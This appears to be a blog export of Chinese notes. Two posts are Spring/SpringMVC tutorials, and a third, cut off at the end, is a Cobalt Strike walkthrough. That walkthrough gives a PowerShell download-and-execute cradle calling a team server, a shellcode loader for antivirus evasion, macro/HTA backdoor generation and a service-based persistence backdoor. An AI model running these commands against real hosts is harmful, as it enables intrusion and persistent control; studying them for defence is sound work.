注解，具备对应功能\n\n\n\n\n注解：\n\n\n名称：@ExceptionHandler\n\n\n类型：方法注解\n\n\n位置：专用于一行处理的控制器方法上方\n\n\n作用：设置指定异常的处理方案，功能等同于控制器方法，出现异常后终止原始控制器执行，并转入当前方法执行\n\n\n范例：\n@ExceptionHandler(Exception.class)\npublic Result doException(Exception ex) &#123;\n    System.out.println(\"嘿嘿 异常你哪里跑\");\n    return new Result(666,null,\"嘿嘿 异常你哪里跑\");\n&#125;\n\n\n说明：此类方法可以根据处理的异常不同，制作多个方法分别处理对应的异常\n\n\n\n\n# 20、项目异常处理\n\n项目异常分类\n\n业务异常（BusinessException）\n\n不规范的用户行为操作产生的异常\n规范的用户行为产生异常\n处理：发送对应消息传递给用户，提醒规范操作\n\n\n系统异常（SystemException）\n\n项目运行中可预计且无法避免的异常\n处理：\n\n发送固定消息传递给用户，安抚用户\n发送特定消息给运维人员，提醒维护\n记录日志\n\n\n\n\n其他异常（Exception）\n\n编程人员未预期到的异常\n处理：\n\n发送固定消息传递给用户，安服用户\n发送特定消息给编程人员，提醒维护（纳入预期范围内）\n记录日志\n\n\n\n\n\n\n\n自定义系统级异常\t自定义项目业务级异常\t自定义异常编码（持续补充）\t触发自定义异常\t拦截并处理异常\n\n实现过程：\n\n新建 exception 包，定义 BusinessException 类和 SystemException 类，继承 RuntimeException 接口，提供 code 值和多个构造方法\n\npackage com.itheima.exception;\n\npublic class BusinessException extends RuntimeException&#123;\n\n    private Integer code;\n\n    public Integer getCode() &#123;\n        return code;\n    &#125;\n\n    public void setCode(Integer code) &#123;\n        this.code = code;\n    &#125;\n\n    public BusinessException(Integer code, String message) &#123;\n        super(message);\n        this.code = code;\n    &#125;\n\n    public BusinessException(Integer code, String message, Throwable cause) &#123;\n        super(message, cause);\n        this.code = code;\n    &#125;\n&#125;\npackage com.itheima.exception;\n\npublic class SystemException extends RuntimeException&#123;\n\n    private Integer code;\n\n    public Integer getCode() &#123;\n        return code;\n    &#125;\n\n    public void setCode(Integer code) &#123;\n        this.code = code;\n    &#125;\n\n    public SystemException(Integer code, String message) &#123;\n        super(message);\n        this.code = code;\n    &#125;\n\n    public SystemException(Integer code, String message, Throwable cause) &#123;\n        super(message, cause);\n        this.code = code;\n    &#125;\n&#125;\n\n在 code 类中完善异常的值\n\npackage com.itheima.controller;\n\npublic class Code &#123;\n    //系统级异常\n    public static final Integer SYSTEM_ERR = 50001;\n    //系统超时异常\n    public static final Integer SYSTEM_TIMEOUT_ERR = 50002;\n    //业务级异常\n    public static final Integer BUSINESS_ERR = 60002;\n    //其他异常\n    public static final Integer SYSTEM_UNKNOWN_CODE = 59999;\n&#125;\n\n在 ProjectExceptionAdvice 类中写处理响应异常方法\n\npackage com.itheima.controller;\n\nimport com.itheima.exception.BusinessException;\nimport com.itheima.exception.SystemException;\nimport org.springframework.web.bind.annotation.ExceptionHandler;\nimport org.springframework.web.bind.annotation.RestControllerAdvice;\n\n@RestControllerAdvice\n//声明这个类是做异常处理的，SpringMVC配置要扫描到所在的包\npublic class ProjectExceptionAdvice &#123;\n    //定义处理异常的方法\n    @ExceptionHandler(Exception.class)\n    //注解声明负责处理哪种异常\n    public Result doException(Exception ex) &#123;\n        //记录日志\n        //发送消息给运维\n        //发送右键给开发人员\n        System.out.println(\"嘿嘿 异常你哪里跑\");\n        return new Result(666,null,\"嘿嘿 异常你哪里跑\");\n    &#125;\n\n    @ExceptionHandler(SystemException.class)\n    //注解抓取处理哪种异常\n    public Result doSystemException(SystemException ex) &#123;\n        //记录日志\n        //发送消息给运维\n        //发送右键给开发人员\n        return new Result(ex.getCode(),null,ex.getMessage());\n    &#125;\n\n    @ExceptionHandler(BusinessException.class)\n    public Result doBusinessException(BusinessException ex) &#123;\n        return new Result(Code.SYSTEM_UNKNOWN_CODE,null,\"系统繁忙，请稍后再试\");\n    &#125;\n&#125;\n\n在业务层的类中抛出异常\n\n@Override\npublic Book getById(Integer id) &#123;\n\n    if(id==1)&#123;\n        throw new BusinessException(Code.BUSINESS_ERR,\"请不要使用你的技术挑战我的耐性\");\n    &#125;\n\n    //将可能出现的异常进行包装，转换成自定义异常\n    try &#123;\n        int i = 1/0;\n    &#125;catch (Exception e) &#123;\n        throw new SystemException(Code.SYSTEM_TIMEOUT_ERR,\"服务器访问超时，请重试\",e);\n    &#125;\n    return bookDao.getById(id);\n&#125;\n# 21、拦截器\n# 21.1 拦截器概念\n\n拦截器（Interceptor）是一种动态拦截方法调用的机制，在 SpringMVC 中动态拦截控制器方法执行\n作用：\n\n在指定的方法调用前后执行预先设定的代码\n阻止原始方法的执行\n\n\n\n# 21.2 拦截器与过滤器区别\n\n归属不同：Filter 属于 Servlet 技术，Interceptor 属于 SpringMVC 技术\n拦截内容不同：Filter 对所有访问进行增强，Interceptor 仅针对 SpringMVC 的访问进行增强\n\n# 21.3 拦截器入门案例\n\n\n制作拦截器功能类，并实现 HandlerInterceptor 接口（注意：扫描加载 bean）\npackage com.itheima.controller.interceptor;\n\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.servlet.HandlerInterceptor;\nimport org.springframework.web.servlet.ModelAndView;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@Component//SpringMvcConfig要扫描到包\npublic class ProjectInterceptor implements HandlerInterceptor &#123;\n    @Override\n    //被拦截之前运行代码\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;\n        System.out.println(\"preHandle\");\n        //false终止原始操作的运行\n        return true;\n    &#125;\n\n    @Override\n    //被拦截执行之后的代码\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;\n        System.out.println(\"postHandle\");\n    &#125;\n\n    @Override\n    //被拦截操作post执行后运行的代码\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;\n        System.out.println(\"afterCompletion\");\n    &#125;\n&#125;\n\n\n定义配置类，继承 WebMvcConfigurationSupport，实现 addInterceptors 方法（注意：扫描加载配置） @ComponentScan(&#123;&quot;com.itheima.controller&quot;,&quot;com.itheima.config&quot;&#125;)\npackage com.itheima.config;\n\nimport com.itheima.controller.interceptor.ProjectInterceptor;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport;\n\n@Configuration\npublic class SpringMvcSupport extends WebMvcConfigurationSupport &#123;\n\n    @Autowired\n    private ProjectInterceptor projectInterceptor;\n\n    @Override\n    protected void addResourceHandlers(ResourceHandlerRegistry registry) &#123;\n        registry.addResourceHandler(\"/pages/**\").addResourceLocations(\"/pages/\");\n        registry.addResourceHandler(\"/css/**\").addResourceLocations(\"/css/\");\n        registry.addResourceHandler(\"/js/**\").addResourceLocations(\"/js/\");\n        registry.addResourceHandler(\"/plugins/**\").addResourceLocations(\"/plugins/\");\n    &#125;\n\n    @Override\n    \n    protected void addInterceptors(InterceptorRegistry registry) &#123;\n        //3.添加拦截器并设定拦截的访问路径，路径可以通过可变参数设置多个\n        registry.addInterceptor(projectInterceptor).addPathPatterns(\"/books\",\"/books/*\");\n    &#125;\n&#125;\n\n\n# 21.4 简化开发\n\n\n直接在 SpringMVCConfig 类中实现 WebMvcConfigurer 接口，可以重写 addResourceHandlers 和 addInterceptors 方法\npackage com.itheima.config;\n\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.EnableWebMvc;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n@Configuration\n@ComponentScan(&#123;\"com.itheima.controller\",\"com.itheima.config\"&#125;)\n@EnableWebMvc\npublic class SpringMvcConfig implements WebMvcConfigurer &#123;\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) &#123;\n    &#125;\n\n    @Override\n    public void addResourceHandlers(ResourceHandlerRegistry registry) &#123;\n    &#125;\n&#125;\n缺点：侵入式较强\n\n\n# 21.5 拦截器执行流程\n\n# 21.6 拦截器参数\n\n\n\n# 21.7 多拦截器执行顺序\n\n当配置多个拦截器时，形成拦截器链\n拦截器链的运行顺序照拦截器添加顺序为准\n当拦截器中出现对原始处理器的拦截，后面的拦截器均终止运行\n\n\n","slug":"SpringMVC","date":"2022-10-12T13:54:41.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"73a343b3bf4c4ffd5c79fde677807ef2","title":"Spring整合开发","content":"# 1、创建目录\n\n\n目录结构如下\n\n\nconfig：存放配置类\ncontroller：表现层\nservice：业务层\ndao：持久层\ndomain：POJO 类\n\n\n\n# 2、用到的所有包坐标\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>junit&lt;/groupId>\n        &lt;artifactId>junit&lt;/artifactId>\n        &lt;version>4.12&lt;/version>\n        &lt;scope>test&lt;/scope>\n    &lt;/dependency>\n    &lt;!--    springweb-->\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-webmvc&lt;/artifactId>\n        &lt;version>5.2.10.RELEASE&lt;/version>\n    &lt;/dependency>\n    &lt;!--    spring-jdbc-->\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-jdbc&lt;/artifactId>\n        &lt;version>5.2.2.RELEASE&lt;/version>\n    &lt;/dependency>\n    &lt;!--    springtest-->\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-test&lt;/artifactId>\n        &lt;version>5.2.2.RELEASE&lt;/version>\n    &lt;/dependency>\n    &lt;!--    mybatis-->\n    &lt;dependency>\n        &lt;groupId>org.mybatis&lt;/groupId>\n        &lt;artifactId>mybatis&lt;/artifactId>\n        &lt;version>3.5.5&lt;/version>\n    &lt;/dependency>\n    &lt;!--    spring整和mybatis-->\n    &lt;dependency>\n        &lt;groupId>org.mybatis&lt;/groupId>\n        &lt;artifactId>mybatis-spring&lt;/artifactId>\n        &lt;version>1.3.0&lt;/version>\n    &lt;/dependency>\n    &lt;!--    mysql-->\n    &lt;dependency>\n        &lt;groupId>mysql&lt;/groupId>\n        &lt;artifactId>mysql-connector-java&lt;/artifactId>\n        &lt;version>8.0.15&lt;/version>\n    &lt;/dependency>\n    &lt;!--    德鲁伊-->\n    &lt;dependency>\n        &lt;groupId>com.alibaba&lt;/groupId>\n        &lt;artifactId>druid&lt;/artifactId>\n        &lt;version>1.1.16&lt;/version>\n    &lt;/dependency>\n    &lt;!--    servlet-->\n    &lt;dependency>\n        &lt;groupId>javax.servlet&lt;/groupId>\n        &lt;artifactId>javax.servlet-api&lt;/artifactId>\n        &lt;version>4.0.1&lt;/version>\n        &lt;scope>provided&lt;/scope>\n    &lt;/dependency>\n    &lt;!--    JSON-->\n    &lt;dependency>\n        &lt;groupId>com.fasterxml.jackson.core&lt;/groupId>\n        &lt;artifactId>jackson-databind&lt;/artifactId>\n        &lt;version>2.9.0&lt;/version>\n    &lt;/dependency>\n&lt;/dependencies>\n\n&lt;build>\n    &lt;plugins>\n        &lt;plugin>\n            &lt;groupId>org.apache.tomcat.maven&lt;/groupId>\n            &lt;artifactId>tomcat7-maven-plugin&lt;/artifactId>\n            &lt;version>2.2&lt;/version>\n            &lt;configuration>\n                &lt;port>80&lt;/port>\n                &lt;path>/&lt;/path>\n            &lt;/configuration>\n        &lt;/plugin>\n    &lt;/plugins>\n&lt;/build>\n# 3、整合 Spring\n# 3.1 Spring 配置\n@Configuration//设置该类为Spring的配置类\n@ComponentScan(&#123;\"com.itheima.service\"&#125;)//扫描Spring的bean包\npublic class SpringConfig &#123;\n&#125;\n# 3.2 mybatis 配置\n# 3.2.1 jdbc.properties\n\n/resources/jdbc.properties\n\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_db?serverTimezone=GMT%2B8&amp;useUnicode=true&amp;characterEncoding=utf-8\njdbc.username=root\njdbc.password=123456\n# 3.2.2 SpringConfig 类修改\n\n先新建 JdbcConfig 类和 MybatisConfig 类，在 SpringConfig 类中添加 Jdbc 和 mybatis 配置，导入 properties 文件\n\n@Configuration\n@ComponentScan(&#123;\"com.itheima.service\"&#125;)\n@PropertySource(\"classpath:jdbc.properties\")//导入properties配置文件，可在JdbcConfig用$&#123;&#125;形式传值\n@Import(&#123;JdbcConfig.class,MybatisConfig.class&#125;)\t//导入mybatis的配置类\npublic class SpringConfig &#123;\n&#125;\n# 3.2.3 JdbcConfig 类\npackage com.itheima.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.jdbc.datasource.DataSourceTransactionManager;\nimport org.springframework.transaction.PlatformTransactionManager;\n\nimport javax.sql.DataSource;\nimport javax.xml.crypto.Data;\n\npublic class JdbcConfig &#123;\n    //用value注解从properties文件中导入值\n    @Value(\"$&#123;jdbc.driver&#125;\")\n    private String driver;\n    @Value(\"$&#123;jdbc.url&#125;\")\n    private String url;\n    @Value(\"$&#123;jdbc.username&#125;\")\n    private String username;\n    @Value(\"$&#123;jdbc.password&#125;\")\n    private String password;\n    \n    @Bean//配置该方法的返回值为bean，获取DataSource对象\n    public DataSource dataSource()&#123;\n        DruidDataSource druidDataSource = new DruidDataSource();\n        druidDataSource.setDriverClassName(driver);\n        druidDataSource.setUrl(url);\n        druidDataSource.setUsername(username);\n        druidDataSource.setPassword(password);\n        return druidDataSource;\n    &#125;\n&#125;\n\n# 3.2.4 MybatisConfig 类\npublic class MybatisConfig &#123;\n    @Bean//配置SqlSessionFactoryBean\n    public SqlSessionFactoryBean sqlSessionFactory(DataSource dataSource)&#123;\n        SqlSessionFactoryBean factoryBean = new SqlSessionFactoryBean();\n        factoryBean.setDataSource(dataSource);\n        factoryBean.setTypeAliasesPackage(\"com.itheima.domain\");\n\n        return factoryBean;\n    &#125;\n\n    @Bean//配置接口代理目录\n    public MapperScannerConfigurer mapperScannerConfigurer()&#123;\n        MapperScannerConfigurer mapperScannerConfigurer = new MapperScannerConfigurer();\n        mapperScannerConfigurer.setBasePackage(\"com.itheima.dao\");\n        return mapperScannerConfigurer;\n    &#125;\n&#125;\n# 3.2.5 在 dao 包下写数据库方法\n\n使用接口代理\n\npackage com.itheima.dao;\n\nimport com.itheima.domain.Book;\nimport org.apache.ibatis.annotations.Select;\n\nimport java.util.List;\n\npublic interface BookDao &#123;\n    @Select(\"select * from tbl_book;\")\n    List&lt;Book> getAll();\n&#125;\n# 3.2.6 业务层接口和实现类\npackage com.itheima.service;\n\nimport com.itheima.domain.Book;\n\nimport java.util.List;\n\npublic interface BookService &#123;\n    List&lt;Book> getAll();\n&#125;\npackage com.itheima.service.impl;\n\nimport com.itheima.dao.BookDao;\nimport com.itheima.domain.Book;\nimport com.itheima.service.BookService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\nimport java.util.List;\n\n@Service //要写注解受Spring管理\npublic class BookServiceImpl implements BookService &#123;\n\n    @Autowired //自动注入，注意这里会报错，但不用管\n    private BookDao bookDao;\n\n    @Override\n    public List&lt;Book> getAll() &#123;\n        return bookDao.getAll();\n    &#125;\n&#125;\n\n# 3.2.7 Junit 整合测试\npackage com.itheima.service;\n\nimport com.itheima.config.SpringConfig;\nimport com.itheima.domain.Book;\nimport com.itheima.service.impl.BookServiceImpl;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\n\nimport java.util.List;\n\n@RunWith(SpringJUnit4ClassRunner.class) //配置\n@ContextConfiguration(classes = SpringConfig.class)  //配置\npublic class BookServiceTest &#123;\t\n\n    @Autowired\n    private BookService bookService;\n\n    @Test\n    public void testGetAll()&#123;\n        List&lt;Book> all = bookService.getAll();\n        System.out.println(all);\n    &#125;\n&#125;\n# 3.3 SpringMvc 配置\n# 3.3.1 SpringMVCConfig 类\n@Configuration\n@ComponentScan(\"com.itheima.controller\")\n@EnableWebMvc //接收JSON参数并自动转换\npublic class SpringMvcConfig &#123;\n&#125;\n# 3.3.2 ServletConfig 类\npublic class ServletConfig extends AbstractAnnotationConfigDispatcherServletInitializer &#123;\n    @Override\n    //获取Spring\n    protected Class&lt;?>[] getRootConfigClasses() &#123;\n        return new Class[]&#123;SpringConfig.class&#125;;\n    &#125;\n\n    @Override\n    //获取SpringMVC\n    protected Class&lt;?>[] getServletConfigClasses() &#123;\n        return new Class[]&#123;SpringMvcConfig.class&#125;;\n    &#125;\n\n    //获取拦截请求路径\n    @Override\n    protected String[] getServletMappings() &#123;\n        return new String[]&#123;\"/\"&#125;;\n    &#125;\n\n\n    //解决中文乱码\n    @Override\n    protected Filter[] getServletFilters() &#123;\n        CharacterEncodingFilter filter = new CharacterEncodingFilter();\n        filter.setEncoding(\"UTF-8\");\n        return new Filter[]&#123;filter&#125;;\n    &#125;\n&#125;\n# 3.3.3 BookController 类功能实现\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController &#123;\n    @Autowired\n    private BookService bookService;\n\n    @GetMapping\n    public List&lt;Book> getAll()&#123;\n        return bookService.getAll();\n    &#125;\n&#125;\n# 3.3.4 使用 postman 测试接口\n\n# 3.4 配置 mysql 事务\n# 3.4.1 在 JdbcConfig 类增加一个事务方法\npublic class JdbcConfig &#123;\n\t/*返回数据源*/\n\n    //事务\n    @Bean\n    public PlatformTransactionManager platformTransactionManager(DataSource dataSource)&#123;\n        DataSourceTransactionManager ds = new DataSourceTransactionManager();\n        ds.setDataSource(dataSource);\n        return ds;\n    &#125;\n&#125;\n# 3.4.2 在 SpringConfig 开启注解式事务驱动\n@Configuration\n@ComponentScan(&#123;\"com.itheima.service\"&#125;)\n@PropertySource(\"classpath:jdbc.properties\")\n@Import(&#123;JdbcConfig.class,MybatisConfig.class&#125;)\n@EnableTransactionManagement//开启注解式事务驱动\npublic class SpringConfig &#123;\n&#125;\n# 3.4.3 在 service 接口挂载注解\n@Transactional//事务注解\npublic interface BookService &#123;\n    /**\n     * 保存\n     * @param book\n     * @return\n     */\n    public boolean save(Book book);\n\n    /**\n     * 修改\n     * @param book\n     * @return\n     */\n    public boolean update(Book book);\n\n    /**\n     * 根据ID删除\n     * @param id\n     * @return\n     */\n    public boolean delete(Integer id);\n\n    /**\n     * 按ID查询\n     * @param id\n     * @return\n     */\n    public Book getById(Integer id);\n\n    /**\n     * 查询全部\n     * @return\n     */\n    public List&lt;Book> getAll();\n&#125;\n\n","slug":"Spring整合开发","date":"2022-10-06T14:07:13.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"2c775c9f2810157671c3686070ee9f85","title":"CobaltStrike","content":"# 1、Cobalt Strike 介绍\n# 1.1 介绍\n\nCobalt Strike 是一款基于 java 的渗透测试神器，常被业界人称为 CS 神器。自 3.0 以后已经不在使用 Metasploit 框架而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和 sessions，可模拟 APT 做模拟对抗，进行内网渗透。\nCobalt Strike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等。\n\n# 1.2 目录结构\n│ agscript 拓展应用的脚本\n│ c2lint 检查profile的错误异常\n│ cobaltstrike\n│ cobaltstrike.jar 客户端程序\n│ icon.jpg\n│ license.pdf\n│ readme.txt\n│ releasenotes.txt\n│ teamserver 服务端程序\n│ update\n│ update.jar\n│\n└─third-party 第三方工具\n    README.vncdll.txt\n    vncdll.x64.dll\n    vncdll.x86.dll\n# 1.3 个人定制\n\nCobalt Strike 可以使用 AggressorScripts 脚本来加强自身，能够扩展菜单栏，Beacon 命令行，提权脚本等\nCobalt Strike 通信配置文件是 Malleable C2 你可以修改 CS 的通讯特征，Beacon payload 的一些行为\nCobalt Strike 可以引用其他的通讯框架 ExternalC2，ExternalC2 是由 Cobalt Strike 提出的一套规范 / 框架，它允许黑客根据需要对框架提供的默认 HTTP (S)/DNS/SMB C2 通信通道进行扩展\n\n# 1.4 启动运行\n\ncobalt strike 的团队服务器最好运行在 linux 平台上，服务端的关键文件是 teamserver 和 cobaltstrike.jar，解压时要将这两个文件放到同一目录下\n可以通过编辑 ./teamserver  文件对启动的端口进行修改\n\n\n\n服务端启动命令 (若无法运行在 Linux 中执行 chmod o+x teamserver )\n\nsudo ./teamserver &lt;HOST> &lt;PASSWORD> [/path/to/c2.profile] [YYYY-MM-DD]\n#例如：\nsudo ./teamserver 10.10.10.132 123456 #一定使用强密码，放在公网会被爆破\n# 参数说明\n&lt;host> 必需参数 团队服务器IP\n&lt;password> 必需参数 连接服务器的密码\n[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性\n[YYYY-MM-DD] 可选参数 所有payload的终止时间\n#放置到后台运行\nsudo nohup ./teamserver 10.10.10.132 123456 &amp;\n\n客户端启动 —— 注意第一次连接会有指纹提示\n\n#windows端直接双击start.bat\n#linux：\nsudo ./cobaltstrike \n#如果无执行权限使用chmod o+x cobaltstrike\n\n# 1.5 偏好设置\n\n客户端每次连接都会自动保存配置文件，可以在偏好设置删除没用的连接信息\n\n\n# 1.6 参数说明\nCobalt Strike\nNew Connection # 新建连接，支持连接多个服务器端\nPreferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录\nVisualization # 主要展示输出结果的视图\nVPN Interfaces # 设置VPN接口\nListenrs # 创建监听器\nScript Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等\nClose # 退出连接\nView\nNew Connection # 新建连接，支持连接多个服务器端\nPreferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录\nVisualization # 主要展示输出结果的视图\nVPN Interfaces # 设置VPN接口\nListenrs # 创建监听器\nScript Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等\nClose # 退出连接\nAttacks\nPackages\nHTML Application # 生成(executable&#x2F;VBA&#x2F;powershell)这三种原理实现的恶意HTA木马文件\nMS Office Macro # 生成office宏病毒文件\nPayload Generator # 生成各种语言版本的payload\nUSB&#x2F;CD AutoPlay # 生成利用自动播放运行的木马文件\nWindows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)\nWindows Executable # 生成可执行exe木马\nWindows Executable(Stageless) # 生成无状态的可执行exe木马\nWeb Drive-by\nManage # 对开启的web服务进行管理\nClone Site # 克隆网站，可以记录受害者提交的数据\nHost File # 提供文件下载，可以选择Mime类型\nScripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery\nSigned Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时)\nSmart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java1.7.0_21以下版本(该方法已过时)\nSystem Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等\nSpear Phish # 鱼叉钓鱼邮件\nReporting\nActivity Report # 活动报告\nHosts Report # 主机报告\nIndicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5hashes\nSessions Report # 会话报告\nSocial Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录\nTactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略\nReset Data # 重置数据\nExport Data # 导出数据，导出.tsv文件格式\nHelp\nHomepage # 官方主页\nSupport # 技术支持\nArsenal # 开发者\nSystem information # 版本信息\nAbout # 关于\n工具栏\n\n1.新建连接\n2.断开当前连接\n3.监听器\n4.改变视图为Pivot Graph(视图列表)\n5.改变视图为Session Table(会话列表)\n6.改变视图为Target Table(目标列表)\n7.显示所有以获取的受害主机的凭证\n8.查看已下载文件\n9.查看键盘记录结果\n10.查看屏幕截图\n11.生成无状态的可执行exe木马\n12.使用java自签名的程序进行钓鱼攻击\n13.生成office宏病毒文件\n14.为payload提供web服务以便下载和执行\n15.提供文件下载，可以选择Mime类型\n16.管理Cobalt Strike上运行的web服务\n17.帮助\n18.关于\n# 2、基础使用上线\n\n执行 ```sudo ./cobaltstrike`` 打开客户端，输入账号密码后登录\n\n\n\n可在视图中打开事件日志\n\n\n\n首先配置监听器，监听器可在上方菜单栏 cobaltstrike 中打开\n\n\n#监听参数说明\n名字：随意，用于区分就好，可设置多个监听器\npayload：\n    Beacon DNS\n    Beacon HTTP\n    Beacon HTTPS\n    Beacon SMB\n    Beacon TCP\n    External C2\n    Foreign HTTP\n    Foreign HTTPS\n地址轮询策略：\n\tround-robin：按主机名的顺序循环浏览主机名列表\n\trandom：每次访问时，从列表中随机选择一个主机名尝试连接。\n\tfailover-xx：使用每台主机一段时间。指定的持续时间（m、h、d），然后使用下一个主机。\nHTTP地址：可以写IP也可以写域名，但是要求IP和域名都是对应的服务端的地址\n配置名称：default\nHTTP端口(上线)：监听器监听的上线端口，可自定义\n# 2.1 HTTP 地址为域名\n\n在域内使用域控主机添加了几条域名，IP 指向服务器地址\n\n\n\n添加三个域名记录\n\n\n\n生成后门并连接\n\n\n# 2.2 基础的 windows.exe 生成\n\n点击攻击 -&gt; 生成后门 -&gt;windows 可执行程序，选择对应的监听器进行保存即可，可选用是否适用 64 位\n\n\n\n\n将生成的文件上传到被攻击主机上执行即可\n\n# 3、dns 上线\n\n如果在内网中防火墙只允许 dns 出网，在 cs 中有 dns 模块，可以使用 dns 使主机上线，需要使用公网服务器和域名\n查询 dns 是否出网命令： nslookup www.baidu,com ，返回结果如下说明可以出网\n\n\n\n设置一条 A 记录指向公网 IP，设置两条 ns 记录指向 A 记录\n\n\n\n建立 dns 监听\n\n\n\n注意：因为 dns 的默认端口是 53 端口，在 ubuntu 的 53 端口默认是开启的，如果出现占用情况，先把 53 端口关闭\n(87 条消息) Linux systemd-resolve 占用 53 端口的解决方法_神尾观铃酱的博客 - CSDN 博客_systemd-resolved 占用 53 号端口\n\nsudo systemctl stop systemd-resolved\n\n使用攻击 -&gt;web 钓鱼 -&gt; 文件投递生成 payload，将 payload 在目标主机 powershell 中执行\n\n\n\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.10.10.132:80&#x2F;adfdf&#39;))&quot;\n\n上线后是一个黑色图标，使用命令 checkin  强制目标回连并更新状态（用于 DNS 上线，DNS 模式下无新任务时目标不会回连 Teamserver）\n在 beacon 支持三种 dns 执行命令方式，一般使用 dns-txt 较多\n\nmode dns 使用DNS A记录作为数据通道（仅支持DNS上线Beacon）\nmode dns-txt 使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）\nmode dns6 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）\n\n# 4、生成后门模块使用\n\n生成后门功能中共有以下几个模块\n\n\n# 4.1 HTA 文档\n\n\nmethod 共有三种：executeable 可执行文件；powershell 命令行；VBA 配合 office，通常使用 PowerShell 配合文件投递使用，同时 powershell 便于制作免杀\n生成文件后使用文件托管进行投递文件\n\n\n\n\n设置好后会出现 powershell 的 payload，别人访问该网站就会上线\n\nhttp:&#x2F;&#x2F;10.10.10.132:80&#x2F;download&#x2F;file.hta\n\n\n# 4.2 Office 宏\n\noffice 宏后门可将生成的 payload 放在 office 文件中，当打开这个文件并启用宏，电脑就会上线\n\n\n\n生成后根据 cs 的提示进行操作即可，另存为的时候要注意选择文件类型\n\n\n\n打开后可能会进行拦截，点击启用宏上线\n\n\n# 4.3 payload 生成器\n\ncs 提供 payload 生成器，因为默认的 shellcode 容易被杀毒软件查杀，使用 shellcode 加载器运行 payload 更容易做免杀\n在 payload 生成器中可以选择各种语言的 payload\n\n\n\n下面提供一个 C 语言生成 shellcode 的代码，使用 release 编译出 exe 后放到主机中执行上线\n\n#include &lt;windows.h>\n#include &lt;stdio.h>\n#pragma comment(linker,\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\")//不显示窗口\nunsigned char shellcode[] = \"\\xfc..\";; #这个变量就是生成的payload\nvoid main()\n&#123;\n    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | \tMEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (Memory == NULL) &#123; return; &#125;\n    memcpy(Memory, shellcode, sizeof(shellcode));\n    ((void(*)())Memory)();\n&#125;\n** 注：** 编译记得使用 Release 模式而不是 Debug 生成 否则回出现错误\n# 4.4 windows 可执行程序\n\nwindows 提供三种生成文件类型\n\nwindwos 可执行程序 直接双击运行\nwindwos 服务程序 可以使用 sc 命令做成服务程序\nwindows dll 文件\n\n\n\n# 4.4.1 exe 可执行程序\n\n生成后门后直接在目标主机运行文件即可上线\n\n# 4.4.2 service exe 服务程序\n\n在 cs 中生成服务程序\n\nshell sc create &quot;server1&quot; binpath&#x3D; &quot;C:\\WINDOWS\\Temp\\server1.exe&quot;\nshell sc description &quot;server1&quot; &quot;description&quot;\nshell sc config &quot;server1&quot; start&#x3D; auto\nshell net start &quot;server1&quot;\n\n执行之后是 system 权限，这也是一种留后门的方法\n# 4.4.3 